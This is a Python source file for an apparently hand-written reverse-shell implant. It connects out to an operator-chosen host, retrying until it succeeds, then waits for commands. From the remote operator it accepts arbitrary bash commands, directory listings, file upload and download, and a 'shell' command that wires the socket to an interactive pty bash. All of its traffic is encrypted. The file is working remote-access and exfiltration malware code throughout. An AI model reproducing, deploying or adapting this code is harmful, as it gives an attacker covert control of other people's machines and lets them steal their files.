from crypt import ClientPyEncryption
from utils import NO_OUTPUT_SIGNAL
import subprocess
import argparse
import logging
import select
import socket
import json
import time
import pty
import os

logging.basicConfig(level=None)

# Constants
SEND_FILE_CMD = "put_file"
GET_FILE_CMD = "get_file"

def stat_to_dict(stat_obj):
    return {
        'st_mode': stat_obj.st_mode,
        'st_ino': stat_obj.st_ino,
        'st_dev': stat_obj.st_dev,
        'st_nlink': stat_obj.st_nlink,
        'st_uid': stat_obj.st_uid,
        'st_gid': stat_obj.st_gid,
        'st_size': stat_obj.st_size,
        'st_atime': stat_obj.st_atime,
        'st_mtime': stat_obj.st_mtime,
        'st_ctime': stat_obj.st_ctime
    }

def scandir_to_dict(path=None):
    if not path: path = None
    entries = os.scandir(path)
    entries_list = []

    for entry in entries:
        entry_dict = {
            'name': entry.name,
            'path': entry.path,
            'inode': entry.inode(),
            'is_dir': entry.is_dir(),
            'is_file': entry.is_file(),
            'is_symlink': entry.is_symlink(),
        }
        try:
            entry_dict['stat'] = stat_to_dict(entry.stat())
        except Exception as e:
            entry_dict['stat'] = str(e)  # Store any error messages
        entries_list.append(entry_dict)
    entries_list = sorted(entries_list, key=lambda x: x['name'])
    return json.dumps((entries_list)).encode()

class Shell:
    def __init__(self):
        self.end_marker = "END_OF_COMMAND" # TODO: This shouldnt be needed

    def execute_command(self, command):
        completed_process = subprocess.run(["/bin/bash", "-c", command],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)

        return completed_process.stdout, completed_process.stderr

    def read_output(self):
        out, err = b"", b""
        while True:
            reads = [self.proc.stdout.fileno(), self.proc.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == self.proc.stderr.fileno():
                    err += self.proc.stderr.read1()
                if fd == self.proc.stdout.fileno():
                    chunk = self.proc.stdout.read1()
                    out += chunk
                    if self.end_marker.encode() in chunk:
                        return out[:-len(self.end_marker)], err

class NetManager:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        while True:
            try:
                self.socket = self.connect_to_host()
            except ConnectionRefusedError:
                time.sleep(1)
                continue
            break
        self.shell = Shell()
        data = self.socket.recv(1024)
        self.socket.sendall(self.execute_command(data))
        self.crypto = ClientPyEncryption()

    def connect_to_host(self):
        """Establishes a connection to the host."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        return s

    def receive_file(self, filename):
        """Receives a file from the socket and writes it to the local system."""
        self.send_msg("ready".encode())
        
        try:
            msg = self.recv_msg()
        except ConnectionResetError:
            return

        with open(filename, "wb") as f:
            f.write(msg)

    def send_file(self, filename):
        """Reads a file from the local system and sends it through the socket."""
        with open(filename, "rb") as f:
            self.send_msg(f.read())

    def change_directory(self, cmd, folder):
        try:
            os.chdir(folder)
            stdout_value = NO_OUTPUT_SIGNAL.encode()
        except FileNotFoundError:
            stdout_value = f"error: {folder} not found".encode()
        finally:
            self.send_msg(stdout_value)

    def handle_commands(self, data):
        """Add description"""
        params = data.decode().split(" ")
        if params[0] == "shell":
            stdout_value = NO_OUTPUT_SIGNAL.encode()
            self.send_msg(stdout_value)
            # Save the old file descriptors
            old_stdin = os.dup(0)
            old_stdout = os.dup(1)
            old_stderr = os.dup(2)
            file_descriptor = self.socket.fileno()
            # Duplicate the file descriptor for standard input, output, and error
            os.dup2(file_descriptor, 0)  # Standard Input
            os.dup2(file_descriptor, 1)  # Standard Output
            os.dup2(file_descriptor, 2)  # Standard Error

            # Spawn a new shell process
            pty.spawn("/bin/bash") # Does not exit for some reason
            # After the pty.spawn is done, restore the old file descriptors
            self.socket.sendall(b"PotatoeMunchkinExit132@@")
            self.socket.recv(1)
            os.dup2(old_stdin, 0)
            os.dup2(old_stdout, 1)
            os.dup2(old_stderr, 2)
            return True
        elif params[0] == "ls":
            if len(params) == 2:
                self.send_msg(scandir_to_dict(params[1]))
            elif len(params) == 1:
                self.send_msg(scandir_to_dict())
            return True
        elif data.decode().split(" ")[0] == "cd":
            cmd = data.decode().split(" ")[0]
            folder = data.decode().split(" ")[1]
            self.change_directory(cmd, folder)
            return True
        elif params[0] == SEND_FILE_CMD:
            file = params[1].strip()
            self.receive_file(file)
            return True
        elif params[0] == GET_FILE_CMD:
            file = params[1].strip()
            self.send_file(file)
            return True
        elif params[0] == "cmd":
            self.send_msg(self.execute_command(data[4:]))
            return True
        return False

    def execute_command(self, data):
        """Executes a command and sends the response back through the socket."""
        stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
        return f"{stdout_value.decode()}{stderr_value.decode()}".encode()

    def send_msg(self, data):
        if len(data) > 0:
            message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)
        else:
            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL.encode(), self.crypto.derived_key)
            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.socket.sendall(message)

    def recv_msg(self):
        chunk = b""
        self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
        data_length_bytes = self.socket.recv(4)
        data_length = int.from_bytes(data_length_bytes, byteorder="big")
        data_bytes = bytearray()
        while len(data_bytes) < data_length:
            chunk = self.socket.recv(data_length - len(data_bytes))
            if chunk == b"":
                raise RuntimeError("socket connection broken")
            data_bytes.extend(chunk)

        return self.crypto.decrypt_message(bytes(data_bytes), self.crypto.derived_key)


    def netloop(self):
        self.crypto.parameters = self.crypto.get_params(self.socket)

        while True:
            try:
                msg = self.recv_msg()
            except ConnectionResetError:
                break
        
            if not msg:
                break
        
            try:
                self.handle_commands(msg)
            except BrokenPipeError:
                logging.error("Connection closed by the host.")
                break
            except Exception as e:
                self.send_msg(str(e).encode())


def main():
    """Main function to parse arguments and start execution."""
    parser = argparse.ArgumentParser()
    parser.add_argument("--host")
    parser.add_argument("--port", type=int)
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()
    if args.test:
        print("Hello world! Wasd")
        return
    
    net_manager = NetManager(args.host, args.port)
    net_manager.netloop()


if __name__ == "__main__":
    main()